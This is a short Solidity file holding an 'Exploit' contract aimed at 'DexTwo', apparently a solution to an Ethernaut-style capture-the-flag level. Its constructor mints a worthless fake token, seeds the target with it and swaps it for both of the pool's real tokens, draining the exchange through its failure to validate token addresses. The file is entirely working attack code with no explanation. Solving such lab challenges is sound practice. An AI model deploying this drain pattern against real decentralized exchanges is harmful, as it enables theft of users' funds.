pragma solidity 0.8.19;

import "src/DexTwo.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract Exploit {
    constructor(address _target) {
        DexTwo d = DexTwo(_target);
        IERC20 token1 = IERC20(d.token1());
        IERC20 token2 = IERC20(d.token2());

        SwappableTokenTwo fakeToken = new SwappableTokenTwo(_target, "fakeToken", "FT", 10000000000);

        fakeToken.approve(_target, type(uint256).max);
        fakeToken.transfer(_target, 100);

        d.swap(address(fakeToken), address(token1), 100);
        d.swap(address(fakeToken), address(token2), 200);
    }
}
